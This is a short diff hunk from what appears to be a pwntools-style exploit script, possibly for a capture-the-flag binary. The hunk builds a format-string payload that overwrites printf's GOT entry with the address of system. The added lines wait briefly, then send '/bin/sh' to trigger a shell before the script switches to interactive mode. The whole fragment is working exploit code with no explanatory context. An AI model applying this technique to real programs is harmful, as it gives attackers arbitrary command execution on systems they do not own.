@@ -36,5 +36,7 @@ payload2[printf_got] = system_addr
 buf = payload2.payload(6, 0)
 
 p.sendline(buf)
+sleep(1)
+p.sendline("/bin/sh")
 
 p.interactive()
